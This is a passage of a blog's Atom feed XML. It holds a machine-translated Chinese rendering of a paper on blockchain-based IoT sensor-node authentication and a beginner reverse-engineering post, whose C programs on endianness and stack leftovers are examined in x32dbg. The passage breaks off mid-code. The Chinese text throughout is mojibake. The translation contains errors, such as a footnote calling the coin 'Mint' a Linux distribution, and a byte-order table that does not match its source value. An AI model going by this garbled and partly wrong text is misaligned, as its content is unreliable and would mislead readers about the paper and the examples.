ä½œä¸ºåˆæ³•çš„ç‰©è”ç½‘è®¾å¤‡ã€‚ ç±»ä¼¼çš„æƒ…å†µå¯èƒ½åœ¨ ç‚¹å¯¹ç‚¹ç½‘ç»œä¹Ÿæ˜¯å¦‚æ­¤ã€‚ ä¾‹å¦‚ï¼Œåˆæ³•çš„ç‰©è”ç½‘ è¿æ¥åˆ°å…¶ä»–ç‰©è”ç½‘è®¾å¤‡çš„èŠ‚ç‚¹è®¾å¤‡ï¼Œå…¶ä¸­ä¸€äº› å¯èƒ½æ˜¯åˆæ³•çš„ï¼Œè€Œå…¶ä»–äººå¯èƒ½æ˜¯æ¶æ„çš„ã€‚ è¿™å¯èƒ½ æœ€ç»ˆå¯¼è‡´ç½‘ç»œæ‹¥å¡å¹¶æ‹’ç»æŸäº›ç‰©è”ç½‘ è®¾å¤‡è®¿é—®ä¸€äº›æ•°æ®æµã€‚ é—®é¢˜æ˜¯ å°†å½±å“ç‰©è”ç½‘è®¾å¤‡çš„è®¤è¯è¿‡ç¨‹ã€‚ å› æ­¤ï¼Œä¸é›†ä¸­å¼ç³»ç»Ÿç›¸æ¯”ï¼Œæ”»å‡»è€… æ­£åœ¨å¤„ç†æ‰€æœ‰éƒ½å…·æœ‰çš„ç‰©è”ç½‘è®¾å¤‡ åŒºå—é“¾çš„å½“å‰çŠ¶æ€ã€‚ å› æ­¤ï¼Œå¯ä»¥å¾—å‡ºç»“è®º DoSæ”»å‡»å¾ˆéš¾é€šè¿‡å¯¹ç­‰ç½‘ç»œè¿›è¡Œï¼Œä»¥æŸå®³æ•´ä¸ªç½‘ç»œçš„å®‰å…¨æ€§ ç‰©è”ç½‘æ•°é‡ä¼—å¤šå¯¼è‡´ç½‘ç»œå’ŒåŒºå—é“¾ è®¾å¤‡ã€‚</p><h3 id="3-Blockchain-based-sensor-node-authentication"><a href="#3-Blockchain-based-sensor-node-authentication" class="headerlink" title="3 Blockchain-based sensor node authentication"></a>3 Blockchain-based sensor node authentication</h3><p>ä½œè€…åº”è¯¥æœ‰è¶³å¤Ÿçš„èƒŒæ™¯ä¿¡æ¯æ¥ æä¾›æœ¬æ–‡ä¸­æ‰€å»ºè®®æ–¹æ³•çš„æ›´å¤šæ¥å—</p><h4 id="3-1-Blockchain"><a href="#3-1-Blockchain" class="headerlink" title="3.1 Blockchain"></a>3.1 Blockchain</h4><p>å› ä¸ºä»»ä½•å‚ä¸ä½¿ç”¨åŒºå—é“¾çš„äºº å¯ä»¥è¾“å…¥ï¼Œæ›´æ”¹æˆ–åˆ é™¤æ•°æ®ï¼ŒTTPï¼ˆä¿¡ä»»ç¬¬ä¸‰æ–¹ï¼‰ ä¸éœ€è¦å­˜åœ¨å°±å¯ä»¥åœ¨ä¸è¯šå®çš„ç½‘ç»œå„æ–¹ä¹‹é—´è¿›è¡Œäº¤æ˜“ã€‚ä¸ºäº†éªŒè¯è¿™ç§äº¤æ˜“ï¼Œä½¿ç”¨å…±è¯†ç®—æ³•ï¼Œå¯ä»¥ä¿è¯å­˜å‚¨åœ¨å…¶ä¸­çš„æ•°æ®çš„å¯é æ€§ ç»è¿‡æˆæƒç”¨æˆ·ä¹‹é—´ç‰¹å®šæœºåˆ¶æ“ä½œåçš„åŒºå—é“¾ã€‚ä»è€Œå®‰å…¨åœ°æ›´æ–°å’Œç»´æŠ¤ åŒºå—é“¾çš„çŠ¶æ€ï¼Œç¡®ä¿ åŒºå—é“¾å›¾1å°†ç”µå­ç¡¬å¸å®šä¹‰ä¸º æ•°å­—ç­¾åã€‚æ¯ä¸ªæˆå‘˜å°†ç¡¬å¸è½¬å‘åˆ°ä¸‹ä¸€ä¸ª é€šè¿‡æ•°å­—ç­¾åå…ˆå‰äº¤æ˜“çš„å“ˆå¸Œå€¼å’Œ ä¸‹ä¸€ä¸ªæˆå‘˜çš„å…¬å…±å¯†é’¥ï¼Œå°†å®ƒä»¬æ·»åŠ åˆ° ç¡¬å¸ã€‚æ”¶æ¬¾äººå¯ä»¥éªŒè¯ç­¾åä»¥éªŒè¯ æˆå‘˜èµ„æ ¼[14]ã€‚åŒºå—é“¾å¦‚å›¾1æ‰€ç¤ºã€‚ å½“å‰å—çš„å€¼ï¼Œæ•°å­—ç­¾åï¼Œå“ˆå¸Œå€¼ å¯¹ç­‰ç½‘ç»œã€‚åº”ç”¨ï¼ˆ2020ï¼‰13ï¼š579â€“589 581 å½“å‰å—ï¼Œå—æ ‡é¢˜å’ŒMerkleæ ¹ä»¥åŠå— æ•°æ®ç”±äº¤æ˜“ç»„æˆã€‚</p><p>é—®é¢˜æ˜¯æ”¶ä»¶äººæ— æ³•éªŒè¯å…¶ä¸­ä¹‹ä¸€ ä¸šä¸»ä¸æ˜¯åŒèŠ±ç¡¬å¸ã€‚å¸¸è§çš„è§£å†³æ–¹æ¡ˆæ˜¯ ä»‹ç»ä¸€ä¸ªå¯é çš„ä¸­å¤®æœºæ„ï¼Œè–„è·ï¼Œäº¤æ˜“ åŒé‡æ”¯å‡ºã€‚æ¯æ¬¡äº¤æ˜“åå¿…é¡»è¿”å› ç¡¬å¸é€ å¸å‚ã€‚ </p><p>æˆ‘ä»¬ç›¸ä¿¡ä¸ä¼šå‘è¡Œæ–°ç¡¬å¸ï¼Œåªä¼šå‘è¡Œç¡¬å¸ ç”±Mint1ç›´æ¥å‘è¡Œçš„å°†è¢«é‡å¤ä½¿ç”¨ã€‚ä¸é—®é¢˜ è¿™ä¸ªè§£å†³æ–¹æ¡ˆæ˜¯æ•´ä¸ªç¬æ—¶ç³»ç»Ÿçš„å‘½è¿ã€‚ å…¬å¸éœ€è¦ç»è¥é€ å¸å‚ï¼Œå¹¶å°†å…¶å…¨éƒ¨é€šè¿‡ äº¤æ˜“é€šè¿‡é“¶è¡Œè¿›è¡Œã€‚æ”¶ä»¶äººä»¥å‰æ²¡æœ‰ç­¾ç½²è¿‡å…ˆå‰çš„ä¼šå‘˜äº¤æ˜“ã€‚åˆ¶ä½œçš„å”¯ä¸€æ–¹æ³• ç¡®ä¿æ²¡æœ‰æ¶‰åŠæ‰€æœ‰äº¤æ˜“çš„äº¤æ˜“ã€‚åŸºäºè–„è· æ¨¡å‹ï¼Œè–„è·çŸ¥é“æ‰€æœ‰äº¤æ˜“ã€‚æˆ‘å†³å®šåˆ°è¾¾ ç¬¬ä¸€ã€‚ä¸ºäº†åœ¨æ²¡æœ‰å¯ä¿¡ä»»æ–¹çš„æƒ…å†µä¸‹å®ç°è¿™ä¸€ç›®æ ‡ï¼Œå…¬å¼€å®£å¸ƒäº†ä»–ä»¬æ”¶åˆ°çš„è®¢å•ã€‚åœ¨æ¯æ¬¡äº¤æ˜“æ—¶ï¼Œå¤§å¤šæ•°èŠ‚ç‚¹éƒ½åŒæ„è¿™æ˜¯ç¬¬ä¸€æ¬¡[14]ã€‚</p><p> æ„æˆåŒºå—é“¾çš„åŒºå—ç”±åŒºå—ç»„æˆ æ ‡å¤´å’Œå—ä½“ã€‚å—å¤´åŒ…å«å“ˆå¸Œ å‰ä¸€ä¸ªå—æ ‡é¢˜çš„å€¼ï¼Œæ‰€æœ‰å—éƒ½æ˜¯ é€šè¿‡é“¾è¡¨ä¹‹ç±»çš„é“¾è¡¨æ–¹æ³•è¿æ¥èµ·æ¥ï¼Œå¹¶ä¸” åŒ…æ‹¬ç”¨äºå…±è¯†çš„ä»»æ„éšæœºæ•° è°ƒæ•´å—ç”Ÿæˆéš¾åº¦çš„ç®—æ³•å’Œä½ã€‚å—ä½“å¯ä»¥å…·æœ‰ä¸åŒçš„å€¼ï¼Œå…·ä½“å–å†³äº ä»–ä»¬æ”¯æŒçš„æœåŠ¡ã€‚ä¾‹å¦‚ï¼Œåœ¨æ¯”ç‰¹å¸ä¸­ï¼Œæ•°å­— å¯†ç ç³»ç»Ÿï¼Œç”¨æˆ·ä¹‹é—´å‘ç”Ÿçš„äº¤æ˜“ å—ä½“ä¸­åŒ…å«10åˆ†é’Ÿã€‚åŒºå—é“¾å¯èƒ½ æˆä¸ºå…¬å…±åŒºå—é“¾ï¼Œç§æœ‰åŒºå—é“¾ï¼Œè´¢å›¢ åŒºå—é“¾å¯ä»¥åˆ†ä¸ºä¸‰ç±»[15]ã€‚æ¯ä¸ªå—ä½“ ç£·åœ¨ç»“æ„ä¸Šå®Œå…¨ç›¸ä¼¼ã€‚ä½†æ˜¯ï¼Œä»–ä»¬ å…·æœ‰ä¸åŒçš„æ¦‚å¿µå’ŒåŠŸèƒ½ï¼Œå¹¶ä¸”åœ¨æ¯ä¸ªåŒºå—é“¾ä¸Šå®šä¹‰å’Œå®ç°ä¹Ÿæœ‰å…ˆå†³æ¡ä»¶ã€‚ å…¬å…±åŒºå—é“¾æ˜¯ç”¨äºæ™®éä½¿ç”¨çš„åŒºå—é“¾ è¢«ç§°ä¸ºæ¯”ç‰¹å¸ï¼Œä»¥åŠç§æœ‰åŒºå—é“¾æˆ–è´¢å›¢ åŒºå—é“¾æ˜¯å°†åŒºå—é“¾ç”¨äºå…¶ä»–æ–¹é¢çš„æ¦‚å¿µ ç›®çš„ã€‚</p><h4 id="3-2-Conventional-IoT-sensor-nodes-authentication-types"><a href="#3-2-Conventional-IoT-sensor-nodes-authentication-types" class="headerlink" title="3.2 Conventional IoT sensor nodes authentication types"></a>3.2 Conventional IoT sensor nodes authentication types</h4><p>åœ¨ç‰©è”ç½‘ç¯å¢ƒä¸­ï¼Œæ”»å‡»è€…ä¼ªè£…æˆç‰©è”ç½‘ å…·æœ‰å„ç§æ”»å‡»ï¼ˆä¾‹å¦‚æ”»å‡»ï¼Œé‡ç”¨æ”»å‡»ï¼Œ å’ŒDoSæ”»å‡»è¢«å…è®¸è®¿é—®å†…éƒ¨ ç‰©è”ç½‘ç¯å¢ƒã€‚ </p><p>åœ¨ç°æœ‰çš„ç‰©è”ç½‘ç¯å¢ƒä¸­ï¼Œæœ‰äº”ç§ä¸åŒçš„ èº«ä»½éªŒè¯åè®®çš„ç±»å‹ã€‚ è¡¨1æ˜¾ç¤ºäº†ä¼˜ç‚¹ æ¯ç§è®¤è¯æŠ€æœ¯çš„åˆ©å¼Š[15]ã€‚</p><h4 id="3-2-1-ID-based-authentication"><a href="#3-2-1-ID-based-authentication" class="headerlink" title="3.2.1 ID-based authentication"></a>3.2.1 ID-based authentication</h4><p>åŸºäºIDçš„èº«ä»½éªŒè¯é€šè¿‡ä½¿ç”¨ç”¨æˆ·çš„ç”µå­é‚®ä»¶åœ°å€ï¼Œåç§°ï¼ŒIPåœ°å€æä¾›æ•°å­—ç­¾åå’Œèº«ä»½éªŒè¯ ä½œä¸ºå…¬é’¥å¯†ç ç³»ç»Ÿã€‚ é¢„åˆ†é…çš„å¯†é’¥ä¸æ˜¯ éœ€è¦ã€‚ è®¡ç®—é‡å°ï¼Œå¯†é’¥é•¿åº¦ä¸º æ¯”è¾ƒçŸ­ã€‚ ä½†æ˜¯ï¼Œå®ƒå®¹æ˜“å—åˆ°IDæ¬ºéª—æ”»å‡»çš„æ”»å‡»ã€‚ æœ‰èµ«æ–¯ç®—æ³•ï¼Œæ—æ©ç®—æ³•ï¼Œç»…å£« å›¾1äº¤æ˜“ä¸­çš„åŒºå—é“¾ 1 Mintæ˜¯åŸºäºDebianå’ŒUbuntuçš„Linuxå‘è¡Œç‰ˆï¼Œå¾ˆå®¹æ˜“ é‡‡ç”¨ã€‚ 582å¯¹ç­‰ç½‘ç»œ åº”ç”¨ ï¼ˆ2020ï¼‰13ï¼š579â€“589 å’ŒSilverbergçš„ç®—æ³•ï¼Œä»¥åŠå„ç§èº«ä»½éªŒè¯ æ–¹æ¡ˆ[15]ã€‚</p><h4 id="3-2-2-Certificate-based-authentication"><a href="#3-2-2-Certificate-based-authentication" class="headerlink" title="3.2.2 Certificate-based authentication"></a>3.2.2 Certificate-based authentication</h4><p>ä¸€ç§ä½¿ç”¨æ•°å­—ç­¾åè¿›è¡Œè®¤è¯çš„æ–¹æ³• å…¬é’¥å¯†ç ç³»ç»Ÿï¼Œå°†ç”¨äºç”µå­ç­¾åçš„ä¿¡æ¯è®°å½•åœ¨è¯ä¹¦ä¸­ï¼Œå¹¶æ ¹æ®è¯¥ä¿¡æ¯æ‰§è¡Œèº«ä»½éªŒè¯ã€‚ åœ¨éŸ©å›½ï¼Œæœ‰å…³ å·²é€šè¿‡ã€Šæ•°å­—ç­¾åæ³•ã€‹å‡†å¤‡äº†å‘è¡Œç³»ç»Ÿå’Œæˆæƒè¯ä¹¦çš„ç®¡ç† æˆç«‹äº1999å¹´ï¼Œå¹¶é¢å‘äº†è¯ä¹¦ ç”±æ ¹CAè¿›è¡Œæœ€é«˜çº§åˆ«çš„è®¤è¯ æœºæ„é€šè¿‡äº”ä¸ªæˆæƒçš„è®¤è¯æœºæ„ã€‚ åœ¨å¤–é¢ åœ¨æ•´ä¸ªå›½å®¶ï¼ŒVerisignçš„è®¾å¤‡è®¤è¯æœåŠ¡åŒ…æ‹¬ ä¸ªäººè®¾å¤‡ï¼Œç”µç¼†è°ƒåˆ¶è§£è°ƒå™¨è®¾å¤‡è®¤è¯ï¼Œä»¥åŠ WiMAXè¡Œä¸šè®¤è¯ã€‚ å¦å¤–ï¼ŒåŸºäºè¯ä¹¦ èº«ä»½éªŒè¯æŠ€æœ¯æ­£åœ¨VoIPï¼Œç½‘ç»œç›‘æ§æ‘„åƒå¤´ç­‰ä¸­ä½¿ç”¨ï¼Œå¹¶ä¸”è¯¥é¢†åŸŸæ­£åœ¨é€æ­¥æ‰©å¤§ã€‚</p><p>åŸºäºè¯ä¹¦çš„èº«ä»½éªŒè¯æŠ€æœ¯æä¾›äº†å¾ˆé«˜çš„ é€šè¿‡å¼ºå¤§çš„èº«ä»½éªŒè¯åŠŸèƒ½å®ç°å®‰å…¨æ€§å¹¶æä¾›ä¸å¯å¦è®¤æ€§ã€‚ ä½†æ˜¯ï¼Œè®¾å¤‡è¯ä¹¦å¤„ç† è½¯ä»¶å’Œç®—æ³•éœ€è¦å¾ˆé«˜çš„è®¡ç®—ååé‡ã€‚ å› æ­¤ï¼Œå®ƒä¸é€‚åˆç”¨äºä½åŠŸè€—ï¼Œä½æ€§èƒ½çš„ç‰©è”ç½‘è®¾å¤‡ã€‚</p><h4 id="3-2-3-Cryptography-protocol-based"><a href="#3-2-3-Cryptography-protocol-based" class="headerlink" title="3.2.3 Cryptography protocol based"></a>3.2.3 Cryptography protocol based</h4><h4 id="3-2-4-MAC-address-based-authentication"><a href="#3-2-4-MAC-address-based-authentication" class="headerlink" title="3.2.4 MAC address based authentication"></a>3.2.4 MAC address based authentication</h4><h4 id="3-2-5-ID-password-based-authentication"><a href="#3-2-5-ID-password-based-authentication" class="headerlink" title="3.2.5 ID/password-based authentication"></a>3.2.5 ID/password-based authentication</h4><h3 id="4-Proposed-P2P-networking-based-IoT-sensor-authentication-by-Blockchain"><a href="#4-Proposed-P2P-networking-based-IoT-sensor-authentication-by-Blockchain" class="headerlink" title="4 Proposed P2P networking based IoT sensor authentication by Blockchain"></a>4 Proposed P2P networking based IoT sensor authentication by Blockchain</h3><h4 id="4-1-Requirements"><a href="#4-1-Requirements" class="headerlink" title="4.1 Requirements"></a>4.1 Requirements</h4><h4 id="4-2-Device-authentication-method"><a href="#4-2-Device-authentication-method" class="headerlink" title="4.2 Device authentication method"></a>4.2 Device authentication method</h4><h4 id="4-3-Hacking-scenario-on-IoT-authentication"><a href="#4-3-Hacking-scenario-on-IoT-authentication" class="headerlink" title="4.3 Hacking scenario on IoT authentication"></a>4.3 Hacking scenario on IoT authentication</h4><h5 id="4-3-1-Jamming-attack-assumption"><a href="#4-3-1-Jamming-attack-assumption" class="headerlink" title="4.3.1 Jamming attack assumption"></a>4.3.1 Jamming attack assumption</h5><h4 id="4-4-Proposed-IoT-authentication-by-Blockchain"><a href="#4-4-Proposed-IoT-authentication-by-Blockchain" class="headerlink" title="4.4 Proposed IoT authentication by Blockchain"></a>4.4 Proposed IoT authentication by Blockchain</h4><h4 id="4-5-Proposed-IoT-multiple-level-node-authentication-model"><a href="#4-5-Proposed-IoT-multiple-level-node-authentication-model" class="headerlink" title="4.5 Proposed IoT multiple-level node authentication model"></a>4.5 Proposed IoT multiple-level node authentication model</h4><h3 id="5-Conclusions"><a href="#5-Conclusions" class="headerlink" title="5 Conclusions"></a>5 Conclusions</h3>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;P2P-networking-based-internet-of-things-IoT-sensor-node-authentication-by-Blockchain-åŸºäºP2Pç½‘ç»œçš„ç‰©è”ç½‘ï¼ˆIoTï¼‰ä¼ æ„Ÿå™¨èŠ‚ç‚¹åŒºå—é“¾è®¤è¯&quot;&gt;&lt;a href=&quot;#P2P-netwo
      
    
    </summary>
    
    
      <category term="translation" scheme="https://singlemindedt.github.io/tags/translation/"/>
    
  </entry>
  
  <entry>
    <title>ç®€å•é€†å‘</title>
    <link href="https://singlemindedt.github.io/2020/05/11/%E7%AE%80%E5%8D%95%E9%80%86%E5%90%91/"/>
    <id>https://singlemindedt.github.io/2020/05/11/ç®€å•é€†å‘/</id>
    <published>2020-05-11T08:32:31.000Z</published>
    <updated>2020-05-14T17:03:28.570Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ç¨‹åºä¸€ã€å­—èŠ‚åº"><a href="#ç¨‹åºä¸€ã€å­—èŠ‚åº" class="headerlink" title="ç¨‹åºä¸€ã€å­—èŠ‚åº"></a>ç¨‹åºä¸€ã€å­—èŠ‚åº</h2><h3 id="ç¨‹åºæºç "><a href="#ç¨‹åºæºç " class="headerlink" title="ç¨‹åºæºç "></a>ç¨‹åºæºç </h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">"windows.h"</span></span></span><br><span class="line">BYTE b=<span class="number">0x12</span>; </span><br><span class="line">WORD w=<span class="number">0x1234</span>;</span><br><span class="line">DWORD dw=<span class="number">0x123456</span>; </span><br><span class="line"><span class="keyword">char</span> str[]=<span class="string">"abcde"</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">byte lb=b;</span><br><span class="line"> WORD lw=w;</span><br><span class="line"> DWORD ldw=dw;</span><br><span class="line"> <span class="keyword">char</span> *lstr=str;</span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>+++</p><h3 id="è¡¥å……"><a href="#è¡¥å……" class="headerlink" title="è¡¥å……"></a>è¡¥å……</h3><p><strong>å°ç«¯åºï¼ˆ Littie endianï¼‰</strong>ï¼šä½åœ°å€å­˜æ”¾ä½å­—èŠ‚ï¼Œé«˜åœ°å€å­˜æ”¾é«˜å­—èŠ‚ï¼Œç¬¦åˆäººç±»æ€ç»´ï¼ˆåœ°å€0x100å¤„ï¼Œå­˜å‚¨æ•´æ•°0x01234567ï¼‰</p><table><thead><tr><th>åœ°å€</th><th>â€¦</th><th>0x100</th><th>0x101</th><th>0x102</th><th>0x103</th><th>â€¦</th></tr></thead><tbody><tr><td>å€¼</td><td>â€¦</td><td>0x67</td><td>0x45</td><td>0x23</td><td>0x01</td><td>â€¦</td></tr></tbody></table><p><strong>å¤§ç«¯åºï¼ˆBig endianï¼‰</strong>:ä½åœ°å€å­˜æ”¾é«˜å­—èŠ‚ï¼Œé«˜åœ°å€å­˜æ”¾ä½å­—èŠ‚</p><table><thead><tr><th>åœ°å€</th><th>â€¦</th><th>0x100</th><th>0x101</th><th>0x102</th><th>0x103</th><th>â€¦</th></tr></thead><tbody><tr><td>å€¼</td><td>â€¦</td><td>0x01</td><td>0x23</td><td>0x45</td><td>0x67</td><td>â€¦</td></tr></tbody></table><p>+++</p><h3 id="ä»£ç åˆ†æ"><a href="#ä»£ç åˆ†æ" class="headerlink" title="ä»£ç åˆ†æ"></a>ä»£ç åˆ†æ</h3><table><thead><tr><th>TYPE</th><th>Name</th><th>SIZE</th><th>å¤§ç«¯åºç±»å‹</th><th>å°ç«¯åºç±»å‹</th></tr></thead><tbody><tr><td>BYTE</td><td>b</td><td>1</td><td><a href="()">12</a></td><td><a href="()">12</a></td></tr><tr><td>WORD</td><td>w</td><td>2</td><td><a href="()">12</a> <a href="()">34</a></td><td><a href="()">34</a> <a href="()">12</a></td></tr><tr><td>DWORD</td><td>dw</td><td>4</td><td><a href="()">12</a> <a href="()">34</a> [56] [78]</td><td>[78] [56] <a href="()">34</a> <a href="()">12</a></td></tr><tr><td>char[]</td><td>str</td><td>6</td><td>[61] [62] [63] [64] [65] [00]</td><td>[61] [62] [63] [64] [65] [00]</td></tr></tbody></table><blockquote><ul><li><p>å¯¹äºchar[]å­—ç¬¦æ•°ç»„ï¼Œåœ¨å†…å­˜ä¸­è¿ç»­ï¼Œä¸ç®¡å¤§ç«¯åºè¿˜æ˜¯å°ç«¯åºï¼Œå­˜å‚¨é¡ºåºéƒ½æ˜¯ä¸€æ ·çš„</p></li><li><p>x86ç³»åˆ—CPUæ˜¯å°ç«¯åºï¼›</p></li><li><p>PowerPCæ˜¯å¤§ç«¯åº;</p></li><li><p>ç½‘ç»œåè®®ä¹Ÿé‡‡ç”¨å¤§ç«¯åºï¼ˆå¤§ç«¯åºä¹Ÿç§°ç½‘ç»œå­—èŠ‚åº)</p></li></ul></blockquote><p>+++</p><h3 id="è°ƒè¯•"><a href="#è°ƒè¯•" class="headerlink" title="è°ƒè¯•"></a>è°ƒè¯•</h3><blockquote><p>ç¯å¢ƒ:x32dbg</p></blockquote><p>mainå‡½æ•°æ±‡ç¼–ä»£ç :</p><p><img src="https://s1.ax1x.com/2020/05/14/YBwPYQ.png" alt="YBwPYQ.png"><br>ç¨‹åºæ‰§è¡Œè‡³<strong>0x4013EB</strong> <code>leave</code>æ—¶çš„ç¨‹åºæ ˆ:</p><p><img src="https://s1.ax1x.com/2020/05/14/YBwpTS.png" alt="YBwpTS.png"><br>ç›¸åº”çš„å‡½æ•°æ ˆå¸§:</p><table><thead><tr><th><strong>ESP</strong></th><th>0022FF40</th><th>00401920</th></tr></thead><tbody><tr><td><strong>lstråœ°å€</strong></td><td><strong>0022FF44</strong></td><td><strong>00402008</strong></td></tr><tr><td><strong>ldw</strong></td><td><strong>0022FF48</strong></td><td><strong>00123456</strong></td></tr><tr><td><strong>bå’Œw</strong></td><td><strong>0022FF4C</strong></td><td><strong>12FD1234</strong></td></tr><tr><td></td><td><strong>0022FF50</strong></td><td><strong>0000000A</strong></td></tr><tr><td></td><td><strong>0022FF54</strong></td><td><strong>00000002</strong></td></tr><tr><td><strong>EBP</strong></td><td><strong>0022FF58</strong></td><td><strong>0022FFF0</strong></td></tr><tr><td><strong>è¿”å›åœ°å€</strong></td><td><strong>0022FF5C</strong></td><td><strong>004010FD</strong></td></tr></tbody></table><p>å¯„å­˜å™¨çŠ¶æ€ï¼Œ<code>EAX=0</code>è¡¨ç¤º<code>return 0</code>è¯­å¥</p><p><img src="https://s1.ax1x.com/2020/05/14/YBwiWj.png" alt="YBwiWj.png"><br>+++</p><h2 id="ç¨‹åºäºŒã€æ ˆçš„è„æ•°æ®"><a href="#ç¨‹åºäºŒã€æ ˆçš„è„æ•°æ®" class="headerlink" title="ç¨‹åºäºŒã€æ ˆçš„è„æ•°æ®"></a>ç¨‹åºäºŒã€æ ˆçš„è„æ•°æ®</h2><h3 id="ç¨‹åºæºç -1"><a href="#ç¨‹åºæºç -1" class="headerlink" title="ç¨‹åºæºç "></a>ç¨‹åºæºç </h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">f1</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a=<span class="number">1</span>,b=<span class="number">2</span>,c=<span class="number">3</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">f2</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a,b,c;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"a=%d,b=%d,c=%d\n"</span>,a,b,c);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">f1();</span><br><span class="line">f2();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>+++<br>[3]:()<br><img src="https://s1.ax1x.com/2020/05/14/YBwCFg.png" alt="YBwCFg.png"></p><p>+++</p><h3 id="è¡¥å……-1"><a href="#è¡¥å……-1" class="headerlink" title="è¡¥å……"></a>è¡¥å……</h3><p>å‡½æ•°æ ˆé€€å‡ºä»¥åï¼ŒåŸæœ‰æ ˆç©ºé—´é‡Œçš„å±€éƒ¨å˜é‡<strong>ä¸ä¼š</strong>è¢«è‡ªåŠ¨æ¸…é™¤ï¼Œæˆä¸ºæ ˆçš„<strong>å™ªéŸ³</strong>æˆ–<strong>è„æ•°æ®</strong>ã€‚<br>+++</p><h3 id="è°ƒè¯•-1"><a href="#è°ƒè¯•-1" class="headerlink" title="è°ƒè¯•"></a>è°ƒè¯•</h3><blockquote><p>ç¯å¢ƒ:x32dbg</p></blockquote><p><strong>f1(),f2()</strong>æ±‡ç¼–ä»£ç :</p><p><img src="https://s1.ax1x.com/2020/05/14/YBwkSs.png" alt="YBwkSs.png"><br>å½“ç¨‹åºæ‰§è¡Œè‡³<strong>0x4013CB</strong> <code>leave</code>ï¼ˆ<strong>f1()</strong>å‡½æ•°å¯¹åº”å‚æ•°å‡å·²å…¥æ ˆï¼‰æ—¶ï¼Œå¯¹åº”æ ˆå¸ƒå±€:</p><p><img src="https://s1.ax1x.com/2020/05/14/YBwSw8.png" alt="YBwSw8.png"><br>ç›¸åº”çš„å‡½æ•°æ ˆå¸§:</p><table><thead><tr><th><strong>ESP</strong></th><th>0022FF38</th><th>0022FFF0</th></tr></thead><tbody><tr><td><strong>c</strong></td><td><strong>0022FF3C</strong></td><td><strong>00000003</strong></td></tr><tr><td><strong>b</strong></td><td><strong>0022FF40</strong></td><td><strong>00000002</strong></td></tr><tr><td><strong>a</strong></td><td><strong>0022FF44</strong></td><td><strong>00000001</strong></td></tr><tr><td><strong>EBP</strong></td><td><strong>0022FF48</strong></td><td><strong>0022FF58</strong></td></tr><tr><td><strong>è¿”å›åœ°å€</strong></td><td><strong>0022FF4C</strong></td><td><strong>00401406</strong></td></tr></tbody></table><p>å½“ç¨‹åºè¿è¡Œè‡³0x4013F4ï¼ˆf2()å‡½æ•°å‚æ•°å‡å·²å…¥æ ˆï¼‰æ—¶ï¼Œæ­¤æ—¶æ ˆå¸ƒå±€:</p><p><img src="https://s1.ax1x.com/2020/05/14/YBwAln.png" alt="YBwAln.png"><br>å¯¹åº”çš„å‡½æ•°æ ˆå¸§ï¼š</p><table><thead><tr><th>ESPï¼ˆprintfç¬¬ä¸€ä¸ªå‚æ•°ï¼‰</th><th>0022FF20</th><th>00403064</th></tr></thead><tbody><tr><td><strong>f2 a</strong></td><td><strong>0022FF24</strong></td><td><strong>00000003</strong></td></tr><tr><td><strong>f2 b</strong></td><td><strong>0022FF28</strong></td><td><strong>0022FFF0</strong></td></tr><tr><td><strong>f2 c</strong></td><td><strong>0022FF2C</strong></td><td><strong>00401950</strong></td></tr><tr><td></td><td><strong>0022FF30</strong></td><td><strong>77C04E42</strong></td></tr><tr><td></td><td><strong>0022FF34</strong></td><td><strong>00401950</strong></td></tr><tr><td></td><td><strong>0022FF38</strong></td><td><strong>0022FFF0</strong></td></tr><tr><td><strong>f1 c</strong></td><td><strong>0022FF3C</strong></td><td><strong>00000003</strong></td></tr><tr><td><strong>f1 b</strong></td><td><strong>0022FF40</strong></td><td><strong>00000002</strong></td></tr><tr><td><strong>f1 a</strong></td><td><strong>0022FF44</strong></td><td><strong>00000001</strong></td></tr><tr><td><strong>EBP</strong></td><td><strong>0022FF48</strong></td><td><strong>0022FF58</strong></td></tr><tr><td><strong>è¿”å›åœ°å€</strong></td><td><strong>0022FF4C</strong></td><td><strong>0040140B</strong></td></tr></tbody></table><p>+++</p><h2 id="ç¨‹åºä¸‰ã€å…³äºAT-amp-Tå’ŒIntel"><a href="#ç¨‹åºä¸‰ã€å…³äºAT-amp-Tå’ŒIntel" class="headerlink" title="ç¨‹åºä¸‰ã€å…³äºAT&amp;Tå’ŒIntel"></a>ç¨‹åºä¸‰ã€å…³äºAT&amp;Tå’ŒIntel</h2><h3 id="ç¨‹åºæºç -2"><a href="#ç¨‹åºæºç -2" class="headerlink" title="ç¨‹åºæºç "></a>ç¨‹åºæºç </h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span 